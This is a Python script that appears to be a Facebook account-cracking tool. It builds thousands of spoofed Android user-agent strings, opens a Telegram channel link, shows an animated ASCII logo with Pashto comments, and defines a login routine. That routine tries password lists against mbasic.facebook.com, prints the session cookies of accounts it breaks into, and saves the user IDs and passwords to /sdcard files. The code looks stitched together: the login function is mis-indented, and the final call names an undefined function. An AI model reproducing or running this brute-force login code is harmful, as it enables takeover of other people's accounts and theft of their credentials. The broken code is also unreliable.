from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('pkg install espeak')
P = '\x1b[1;97m' # 
M = '\033[1;33m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;96m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
id = []
user = []
oks = []
cps = []
loop = 0
ugen=[]
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      aJaber=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(aJaber)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhhaj)
os.system("xdg-open https://t.me/JAVA_SCIPT_KING")
# ---------- UI: WACIQ ASCII لوگو + رنګین انیمیشن ----------
import sys
import time
import threading
import shutil
import random

# ستا ورکړل شوی ASCII لوگو (دقیقاً همداسې)
LOGO = r"""
██╗    ██╗ █████╗  ██████╗██╗ ██████╗ 
██║    ██║██╔══██╗██╔════╝██║██╔═══██╗
██║ █╗ ██║███████║██║     ██║██║   ██║
██║███╗██║██╔══██║██║     ██║██║   ██║
╚███╔███╔╝██║  ██║╚██████╗██║╚██████╔╝
 ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝╚═╝ ╚═════╝
"""

# رنګونه (ANSI)
COLOR_CYCLE = ['\033[95m', '\033[96m', '\033[94m', '\033[93m', '\033[92m']
BOLD = '\033[1m'
RESET = '\033[0m'

# انیمیشن کنټرول
_stop_logo_event = threading.Event()
_logo_thread = None

def _clear():
    try:
        sys.stdout.write("\033c")
    except Exception:
        pass

def _center(line):
    cols = shutil.get_terminal_size((80, 20)).columns
    pad = max(0, (cols - len(line)) // 2)
    return ' ' * pad + line

def _animated_logo_once(duration=1.6, fps=12):
    """لنډ sparkle او رنگی چوکاټونه د LOGO لپاره."""
    lines = LOGO.strip('\n').splitlines()
    frames = int(duration * fps)
    for f in range(frames):
        if _stop_logo_event.is_set():
            return
        _clear()
        color = COLOR_CYCLE[f % len(COLOR_CYCLE)]
        # چاپ لوگو په center سره
        for ln in lines:
            print(_center(color + BOLD + ln + RESET))
        # تصادفي ستوري/سپارکل په پرده کې
        cols = shutil.get_terminal_size((80, 20)).columns
        star_count = random.randint(6, 12)
        for _ in range(star_count):
            try:
                r = random.randint(0, len(lines) - 1)
                c = random.randint(0, cols - 1)
                # cursor movement: که ترمینل ملاتړ ونکړي، نو دا بلاک به خاموش پاتې شي
                sys.stdout.write("\033[s")  # save cursor
                sys.stdout.write(f"\033[{3 + r};{c}H")  # approximate position
                sys.stdout.write(random.choice(COLOR_CYCLE) + BOLD + "*" + RESET)
                sys.stdout.write("\033[u")  # restore
            except Exception:
                pass
        sys.stdout.flush()
        time.sleep(1.0 / fps)

def _reveal_center_text(lines, char_delay=0.002, line_pause=0.05):
    """ورو ورو هر کرښه د مرکز په ښودلو سره جوړوي (character by character)."""
    for ln in lines:
        if _stop_logo_event.is_set():
            return
        centered = _center(ln)
        out = ""
        for ch in centered:
            out += ch
            sys.stdout.write(BOLD + COLOR_CYCLE[0] + out + RESET + "\r")
            sys.stdout.flush()
            time.sleep(char_delay)
        sys.stdout.write(BOLD + COLOR_CYCLE[0] + centered + RESET + "\n")
        sys.stdout.flush()
        time.sleep(line_pause)

def _logo_animation_loop(loop_forever=False):
    """بشپړ انیمیشن: sparkle بیا reveal."""
    try:
        while not _stop_logo_event.is_set():
            _animated_logo_once(duration=1.6, fps=14)
            if _stop_logo_event.is_set():
                break
            _clear()
            # د LOGO کرښې ورو ورو بیا وښیه (دلته هم د LOGO استعمالیږي)
            lines = LOGO.strip('\n').splitlines()
            _reveal_center_text(lines, char_delay=0.003, line_pause=0.06)
            time.sleep(0.6)
            if not loop_forever:
                break
    except Exception:
        pass

def start_logo_thread(loop_forever=False):
    """انیمیشن په دیمان thread کې شروع کوي."""
    global _logo_thread, _stop_logo_event
    if _logo_thread and _logo_thread.is_alive():
        return _logo_thread
    _stop_logo_event.clear()
    _logo_thread = threading.Thread(target=_logo_animation_loop, args=(loop_forever,), daemon=True)
    _logo_thread.start()
    return _logo_thread

def stop_logo_thread(timeout=0.5):
    """انیمیشن ودروي او thread ته وخت ورکوي چې وتړل شي."""
    global _logo_thread, _stop_logo_event
    _stop_logo_event.set()
    if _logo_thread:
        _logo_thread.join(timeout=timeout)
        _logo_thread = None

# --------------- د کارولو مثال ----------------
if __name__ == "__main__":
    # انیمیشن شروع او وروسته مثلاً مینو ښکاره کړئ
    start_logo_thread(loop_forever=False)  # یو ځل انیمیشن
    time.sleep(2.0)                        # څو ثانیې لپاره اجازه ورکړئ ښکاره شي
    stop_logo_thread()
    _clear()
    # اوس اصلي لوگو چاپ کړئ او مینو یا نور څه وښایئ
    for ln in LOGO.strip('\n').splitlines():
        print(_center(BOLD + COLOR_CYCLE[0] + ln + RESET))
    print("\n")
    print(_center("=== Welcome to WACIQ ==="))
    # دلته خپل menu یا نور چاپ کول ایښودلای شئ 
	def Jaberm(uid,pwx,tl): 
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mՏᎬᎪᎡᏟᎻᏆΝᏀ\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mJABER-BD\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/JABER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[JABER-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/JABER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
Jaber() 
